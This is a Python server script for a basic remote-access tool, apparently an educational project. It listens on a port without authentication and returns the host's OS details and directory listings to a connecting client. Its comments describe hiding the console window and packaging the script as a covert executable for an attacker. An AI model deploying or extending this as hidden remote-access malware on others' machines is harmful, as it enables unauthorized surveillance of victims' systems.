#import win32gui, win32con

#hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(hide , win32con.SW_HIDE)
#the above code could be uncommented in order to avoid showing the python window,
#In the case of an attacker, you would modify this code to be run without someone knowing as
#a downloadable executable depending on the OS

import socket, platform, os

ServerAddress = ""
ServerPort = 44444 #designate port here

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #creates socket for connection to be established
s.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #sets options for socket behavior
s.bind ((ServerAddress, ServerPort)) #bind ipaddress and port pair to socket
s.listen(1) #waits for incoming connections
connection, address = s.accept() #accepts Connection

while 1: #while connection is active, data is sent back to Client
    try:
        data = connection.recv(1024)
    except:continue

    if (data.decode('utf-8') == '1'): #recieves input from user and decodes to match menu option from client side
        tosend = platform.platform() + " " + platform.machine() #gets OS details from current machine
        connection.sendall(tosend.encode()) #sends encoded data back to client, then its decoded on client side into human readable form

    elif (data.decode('utf-8') == '2'): #same as previous condition except, checks and sends list of Directories and files
        data = connection.recv(1024)
        try:
            filelist = os.listdir(data.decode('utf-8'))
            tosend = ""
            for x in filelist:
                tosend += "," + x
        except: #if listed path is incorrect or does not exist, alerts Client
            tosend ="Wrong path"
        connection.sendall (tosend.encode())
    elif (data.decode ('utf-8') == '0'): #exits Connection
        connection.close()
        connection, address = s.accept ()
